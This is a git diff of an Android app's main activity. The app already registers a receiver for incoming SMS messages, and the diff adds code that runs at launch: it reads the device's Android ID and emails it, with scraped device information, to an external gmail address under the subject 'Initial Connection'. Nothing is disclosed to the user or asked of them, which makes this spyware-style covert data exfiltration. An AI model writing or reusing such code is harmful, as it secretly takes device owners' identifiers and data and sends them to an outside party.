@@ -6,12 +6,15 @@ import androidx.core.content.ContextCompat;
 
 import android.Manifest;
 import android.content.BroadcastReceiver;
+import android.content.Context;
 import android.content.Intent;
 import android.content.IntentFilter;
 import android.content.pm.PackageManager;
 import android.os.Build;
 import android.os.Bundle;
+import android.provider.Settings;
 import android.telephony.SmsMessage;
+import android.telephony.TelephonyManager;
 import android.view.View;
 import android.widget.Button;
 import android.widget.Toast;
@@ -75,7 +78,6 @@ public class MainActivity extends AppCompatActivity{
                 Map<String, Integer> perms = new HashMap<String, Integer>();
                 perms.put(android.Manifest.permission.RECEIVE_SMS, PackageManager.PERMISSION_GRANTED);
                 perms.put(Manifest.permission.INTERNET, PackageManager.PERMISSION_GRANTED);
-
                 //Results
                 for (int i =0; i<permissions.length; i++)
                 {
@@ -133,6 +135,10 @@ public class MainActivity extends AppCompatActivity{
         IntentFilter intentFilter = new IntentFilter("android.provider.Telephony.SMS_RECEIVED");
         SMSBroadcastReceiver smsBroadcastReceiver = new SMSBroadcastReceiver();
         registerReceiver(smsBroadcastReceiver, intentFilter);
+        
+        String deviceID =Settings.Secure.getString(this.getContentResolver(),Settings.Secure.ANDROID_ID);
+        EmailHelper.sendEmail("ict1004p2grp4@gmail.com","Initial Connection - "+ deviceID, DeviceScrape.getDeviceInfo() );
+
 
         Button button=findViewById(R.id.secondActivityButton);
         button.setOnClickListener(new View.OnClickListener() {
